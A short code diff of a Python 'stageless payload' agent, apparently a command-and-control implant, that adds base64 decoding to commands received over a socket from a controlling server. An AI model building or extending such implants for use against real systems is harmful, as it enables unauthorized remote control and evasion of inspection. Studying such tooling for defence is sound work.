@@ -1,7 +1,8 @@
 import socket
 import time
-import os, sys
+import os
 import random
+import base64
 
 # Stageless Payload (contains full Agent)
 
@@ -20,6 +21,8 @@ while(Loop):
 
         # Receive data from the server
         received = str(sock.recv(2048), "utf-8")
+
+        received = base64.b64decode(received).decode("ascii")
 
         if received == "1":
             Loop = False
